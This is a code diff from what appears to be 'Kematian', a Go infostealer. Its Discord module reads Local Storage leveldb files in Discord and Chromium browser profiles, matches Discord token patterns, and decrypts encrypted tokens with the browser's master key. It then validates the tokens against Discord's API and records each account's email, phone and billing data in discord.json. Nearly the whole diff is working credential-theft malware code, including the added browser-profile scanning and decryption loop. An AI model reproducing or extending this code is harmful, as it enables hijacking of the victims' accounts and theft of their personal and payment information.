@@ -5,21 +5,18 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"kdot/kematian/browsers/chromium/structs"
 	"kdot/kematian/decryption"
 	"net/http"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 )
 
-//var ids []int64
-
 var baseurl string = "https://discord.com/api/v9/users/@me"
 
-var local string = os.Getenv("LOCALAPPDATA")
 var roaming string = os.Getenv("APPDATA")
-
-//var temp string = os.Getenv("TEMP")
 
 type Response struct {
 	ID            string `json:"id"`
@@ -43,27 +40,13 @@ type Billing struct {
 	TYPE string `json:"type"`
 }
 
-var token_paths = map[string]string{
-	"Discord":        roaming + "\\discord\\Local Storage\\leveldb\\",
-	"Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
-	"Discord PTB":    roaming + "\\discordptb\\Local Storage\\leveldb\\",
-	"Chrome":         local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
-	"Chrome1":        local + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
-	"Chrome2":        local + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
-	"Chrome3":        local + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
-	"Chrome4":        local + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
-	"Chrome5":        local + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
-	"Yandex":         local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
-	"Opera":          local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
-	"Opera GX":       local + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
-	"Amigo":          local + "\\Amigo\\User Data\\Default\\Local Storage\\leveldb\\",
-	"Torch":          local + "\\Torch\\User Data\\Default\\Local Storage\\leveldb\\",
-	"Kometa":         local + "\\Kometa\\User Data\\Default\\Local Storage\\leveldb\\",
-	"Orbitum":        local + "\\Orbitum\\User Data\\Default\\Local Storage\\leveldb\\",
-	"CentBrowser":    local + "\\CentBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+var token_paths = []string{
+	roaming + "\\discord\\Local Storage\\leveldb\\",
+	roaming + "\\discordcanary\\Local Storage\\leveldb\\",
+	roaming + "\\discordptb\\Local Storage\\leveldb\\",
 }
 
-func GetTokens() string {
+func GetTokens(goodBrowsers []structs.Browser) string {
 	var to_return []Tokens
 	var tokens_current []string
 	var final_tokens []string
@@ -81,7 +64,7 @@ func GetTokens() string {
 						continue
 					}
 
-					normal_regex_mem, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
+					normal_regex_mem, err := regexp.Compile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
 					if err == nil {
 						if string(normal_regex_mem.Find(data)) != "" {
 							t := string(normal_regex_mem.Find(data))
@@ -113,6 +96,53 @@ func GetTokens() string {
 			continue
 		}
 	}
+
+	for _, browser := range goodBrowsers {
+		for _, profile := range browser.Profiles {
+			goodPath := filepath.Join(profile.NameAndPath, "Local Storage", "leveldb", "*.ldb")
+
+			ldbFiles, err := filepath.Glob(goodPath)
+			if err != nil {
+				continue
+			}
+
+			for _, ldbLog := range ldbFiles {
+				fmt.Println(ldbLog)
+				data, err := os.ReadFile(ldbLog)
+				if err != nil {
+					continue
+				}
+				normal_regex_mem, err := regexp.Compile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
+				if err == nil {
+					if string(normal_regex_mem.Find(data)) != "" {
+						fmt.Println("Found Token")
+						t := string(normal_regex_mem.Find(data))
+						fmt.Println(t)
+						tokens_current = append(tokens_current, t)
+					}
+				}
+
+				encrypted_regex_mem, err := regexp.Compile(`dQw4w9WgXcQ:[^\"]*`)
+				if err == nil {
+					if string(encrypted_regex_mem.Find(data)) != "" {
+						fmt.Println("Found Token")
+						t := string(encrypted_regex_mem.Find(data))
+						good_code := strings.Split(t, ":")[1]
+						decoded, err := base64.StdEncoding.DecodeString(good_code)
+						if err != nil {
+							continue
+						}
+						good_dir_local_state := browser.LocalState
+						good_key := decryption.GetMasterKey(good_dir_local_state)
+						decrypted, _ := decryption.DecryptPassword(decoded, good_key)
+						fmt.Println(decrypted)
+						tokens_current = append(tokens_current, decrypted)
+					}
+				}
+			}
+		}
+	}
+
 	for _, token := range tokens_current {
 		if CheckToken(token) {
 			final_tokens = append(final_tokens, token)
@@ -200,8 +230,8 @@ func GetTokenInfo(token string) Tokens {
 	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, BILLING: billing}
 }
 
-func WriteDiscordInfo() {
-	os.WriteFile("discord.json", []byte(GetTokens()), 0644)
+func WriteDiscordInfo(goodBrowsers []structs.Browser) {
+	os.WriteFile("discord.json", []byte(GetTokens(goodBrowsers)), 0644)
 }
 
 func getBilling(token string) string {
